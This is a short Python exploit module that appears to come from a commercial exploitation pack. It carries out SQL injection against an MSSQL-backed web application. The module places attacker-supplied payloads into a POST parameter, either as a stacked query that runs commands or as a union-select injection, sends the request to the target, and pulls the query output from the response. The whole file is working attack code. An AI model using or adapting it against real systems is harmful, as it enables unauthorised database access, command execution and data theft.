#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import os, sys

libpath = os.path.join(os.path.dirname(__file__), '../lib')
if libpath not in sys.path: sys.path.append(libpath)

###
# STD modules
###
import logging, urllib, urllib2, optparse, re

###
# SQLjack
###
import libsqljack

class exploit(libsqljack.exploit):

    EXPLOIT_TYPE = "mssql"

    def place_payload(self, payload):
        POSTDATA = {}
        if payload.has_key("mssql_exec"):
            POSTDATA['pwn'] = '2;%s' % payload["mssql_exec"]
        elif payload.has_key("mssql_inject"):
            POSTDATA['pwn'] = '-1 union select %s' % payload["mssql_inject"]
        else:
            self.log.error("Failed to placed payload.")
            return False
        self.result = libsqljack.send_web_request(self.url, POSTDATA)
        return True

    def parse_result(self, result):
        matches = re.findall("Resultats : \[(.*)\]", self.result)
        if matches:
            result = matches[0]
            result = result.replace("\r\n", "\n").replace("\r", "\n")
        else:
            result = ''
        return super(exploit, self).parse_result(result)

if __name__ == '__main__': exploit().run_cli()
